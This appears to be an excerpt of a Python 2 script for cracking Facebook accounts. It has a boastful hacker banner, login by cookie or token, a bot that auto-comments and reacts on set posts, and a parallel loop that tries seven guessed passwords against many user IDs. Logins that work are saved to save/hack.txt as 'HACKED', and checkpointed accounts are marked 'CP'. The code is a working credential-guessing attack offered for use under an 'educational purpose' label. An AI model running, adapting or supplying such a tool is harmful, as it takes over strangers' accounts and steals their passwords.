...
logo = """		
                      ▄︻̷̿┻̿═━一T̼̼̖̾͟͞Ơ̷̴̪̪̝͈̥͈̆̀̚R̛̦̦̝̤͌̏͜͟͜ A̳̳̹̟̋ͣ͌ͅĻ͓͓̣̽͟A̳̳̹̟̋ͣ͌ͅK̭̭͔͓̦̏̎͠╾━╤デ╦︻
 ▂▄▅▆▇█▄҉︻҉̷҉̿҉┻҉̿҉═҉━҉一҉X҉E҉N҉A҉K҉A҉R҉╾҉━҉╤҉デ҉╦҉︻҉█▇▆▅▄▂
                 ▂▄▅▆▇█████████▇▆▅▄▂
\x1b[1;94m──────────────────────────────────────────────────────
    |\               ╔────── ¤ ◎ - ◎ ¤ ──────╗
    |  \
...
   |    /            
   | /                ╚────── ¤ ◎ - ◎ ¤ ──────╝
\x1b[1;94m──────────────────────────────────────────────────────
\x1b[1;92m➣ “Human Stupidity, that’s why Hackers always win.”
\x1b[1;94m➣ Roy BLACK HAT HACKER
\x1b[1;93m➣     AUTHOR : HAMADO
\x1b[1;93m➣       FROM : DER
\x1b[1;97m➣   WHATSAPP : MUNNI BURA MAN JAYGI
\x1b[1;92m➣    WARNING : I'm a hacker, but I'm the good kind of hackers. And I've never been a criminal.
\x1b[1;97m➣    WARNING : ONLY EDUCATIONAL PURPOSE 
\x1b[1;92m➣    WARNING : DON'T COPY MY SCRIPT
\x1b[1;93m➣    NOTE         : IF YOU GET TO FACE PROBLEM CLONING TIME
\x1b[1;97m➣    NOTE         : USE PROXY INDONESIA FOR CLONING  
\x1b[1;94m──────────────────────────────────────────────────────""" 
...
def masuk():
    os.system('clear')
    print logo
    print '\x1b[1;93m[01]\x1b[1;93m\x1b[1;95m\x1b[1;97m Login Using Facebook cookies'
    print '\x1b[1;93m[02]\x1b[1;92m\x1b[1;95m\x1b[1;93m Login Using Facebook Token'
...
def tokenz():
    ...
    try:
        ...
        zedd.write(toket)
        zedd.close()
        jalan('\x1b[1;95mLETS START CRACKING:) ')
        print '\x1b[1;92m[\x1b[1;39m\xe2\x9c\x93\x1b[1;97m]\x1b[1;39mSuccessful Login'
        os.system('xdg-open')
        bot_komen()
    except KeyError:
...
def bot_komen():
    ...
    una = '100041129048948'
    kom = 'Mr.Roy\xf0\x9f\x98\x98'
    kom = 'Mr.Roy\xf0\x9f\x98\x8e'
    reac = 'LOVE'
    post = '481555709892060'
    post2 = '481559296558368'
    kom2 = 'Mr.roy\xf0\x9f\x98\x98\xe2\x98\xa0\xef\xb8\x8f'
    kom = 'Mr.Roy\xf0\x9f\x98\x98\xf0\x9f\x98\x98'
...
def pilih_super():
    ...
    if peak == '':
        ...
        os.system('clear')
        print logo
        print 1 * '\x1b[1;96m[0m'
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[ROY-HACKED] ' + user + ' |\x1b[0m ' + p1
                cek = open('save/hack.txt', 'a')
                cek.write(user + '|' + p1 + '\n')
                cek.close()
                oks.append(user + p1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[ZABI-CP] ' + user + ' |\x1b[0m ' + p1
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print '\x1b[1;;92m[ROY-HACKED] ' + user + ' |\x1b[0m ' + p2
                    cek = open('save/hack.txt', 'a')
                    cek.write(user + '|' + p2 + '\n')
                    cek.close()
                    oks.append(user + p2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;;97m[ROY-CP] ' + user + ' |\x1b[0m ' + p2
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;97m [ROY-CP] ' + user + ' |\x1b[0m ' + p3
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print '\x1b[1;92m[Roy-HACKED] ' + user + ' |\x1b[0m ' + p4
                            cek = open('save/hack.txt', 'a')
                            cek.write(user + '|' + p4 + '\n')
                            cek.close()
                            oks.append(user + p4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print '\x1b[1;97m[Roy-CP] ' + user + ' |\x1b[0m ' + p4
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Roy-HACKED] ' + user + ' |\x1b[0m ' + p5
                                cek = open('save/hack.txt', 'a')
                                cek.write(user + '|' + p5 + '\n')
                                cek.close()
                                oks.append(user + p5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print '\x1b[1;93m [ZABI-CP] ' + user + ' |\x1b[0m ' + p5
                                ...
                                q = json.load(data)
                                if 'access_token' in q:
                                    print '\x1b[1;92m[Roy-HACKED] ' + user + ' |\x1b[0m ' + p6
                                    cek = open('save/hack.txt', 'a')
                                    cek.write(user + '|' + p6 + '\n')
                                    cek.close()
                                    oks.append(user + p5)
                                elif 'www.facebook.com' in q['error_msg']:
                                    print '\x1b[1;;97m [ROY-CP] ' + user + ' |\x1b[0m ' + p6
                                    ...
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        print '\x1b[1;92m[Roy-HACKED] ' + user + ' |\x1b[0m ' + p7
                                        cek = open('save/hack.txt', 'a')
                                        cek.write(user + '|' + p7 + '\n')
                                        cek.close()
                                        oks.append(user + p7)
                                    elif 'www.facebook.com' in q['error_msg']:
                                        print '\x1b[1;93m[ZABI-CP] ' + user + ' |\x1b[0m ' + p7
                                        cekpoint.append(user + p6)
        except:
            pass
    ...
    p.map(main, id)
    print 25 * '-'
    print '\x1b[1;93m[HACKING DONE !'
    print '\x1b[1;93m[HACKED : ' + str(len(oks))
    print '\x1b[1;93m[CHEEK : ' + str(len(cekpoint))
    print '\x1b[1;93m[File save ~> save/hack.txt'
    print 25 * '-'
    print ' Thank you for Using My Tools'
    os.sys.exit(0)
